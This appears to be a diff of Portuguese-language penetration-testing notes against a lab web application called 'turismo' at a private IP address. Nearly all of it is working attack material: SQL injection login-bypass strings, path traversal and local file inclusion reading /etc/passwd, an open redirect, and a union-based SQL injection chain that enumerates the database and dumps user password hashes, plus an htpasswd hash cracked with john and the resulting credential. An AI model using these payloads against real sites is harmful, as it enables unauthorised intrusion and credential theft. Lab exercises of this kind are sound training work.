@@ -78,5 +78,88 @@ http://172.16.1.10/turismo/link.php?link=https://turismo.ig.com.br/manual-do-via
 
 OPEN REDIRECT
 172.16.1.10/turismo/redir.php?url=
+http://172.16.1.10/turismo/pages.php?page=bG9naW4ucGhw
 PÁGINA FALSA DE AUTENTICAÇÃO OK
 
+--------------------------------------------------------------------
+
+BYPASS AUTHENTICATION SQL INJECTION
+
+http://172.16.1.10/turismo/login.php
+' 1=1 #
+user mrtur
+
+teste' or id=1#
+user teste
+
+--------------------------------------------------------------------
+
+FPD (FULL PATH DISCLOSURE)
+
+/var/www/html/turismo/logado.php
+
+PATH TRAVERSAL / DIRECTORY TRAVERSAL
+
+http://172.16.1.10/turismo/logado.php?banners=../../../../../
+
+http://172.16.1.10/s3cr3tlogs - administrador:$apr1$mN0Pqynw$Zo4QTRkA2GwcVVRR/FKSu1
+
+john hashSecret --wordlist=/usr/share/wordlists/rockyou.txt
+
+administrador:michael - senha para http://172.16.1.10/logs
+
+--------------------------------------------------------------------
+
+LFI
+
+http://172.16.1.10/turismo/info.php?p=sobre.php
+http://172.16.1.10/turismo/info.php?p=/../../../../etc/passwd
+
+--------------------------------------------------------------------
+
+RFI
+
+http://172.16.1.10/turismo/link.php?link=https://turismo.ig.com.br/manual-do-viajante/index
+
+--------------------------------------------------------------------
+
+HTML INJECTION
+
+http://172.16.1.10/turismo/procurar.php?busca=teste
+
+--------------------------------------------------------------------
+
+SQLi - ERROR BASED
+
+http://172.16.1.10/turismo/agencias.php?loja=sp
+
+http://172.16.1.10/turismo/agencias.php?loja=%27%20union%20select%201,%202%20,version(),user(),database()%23
+
+Agencia: 8.0.20-0ubuntu0.20.04.1
+Local: turismo@localhost
+Telefone: dbmrtur
+
+http://172.16.1.10/turismo/agencias.php?loja=%27%20union%20select%201,%202%20,table_name,4,5%20from%20information_schema.tables%20where%20table_schema=%22dbmrtur%22%23
+
+Agencia: adm
+Agencia: agencias
+Agencia: destinos
+Agencia: mrusers
+Agencia: promo
+
+http://172.16.1.10/turismo/agencias.php?loja=%27%20union%20select%201,%202%20,column_name,4,5%20from%20information_schema.columns%20where%20table_schema=%22dbmrtur%22%20and%20table_name=%22mrusers%22%23
+
+Agencia: id
+Agencia: nome
+Agencia: login
+Agencia: senha
+
+http://172.16.1.10/turismo/agencias.php?loja=%27%20union%20select%201,%202%20,nome,login,senha%20from%20dbmrtur.mrusers%23
+
+Agencia: MR Turismo
+Local: mrtur
+Telefone: 3ae972b1d20221a3bd0415bb525d65da
+
+Agencia: teste
+Local: teste
+Telefone: 698dc19d489c4e4db73e28a713eab07b
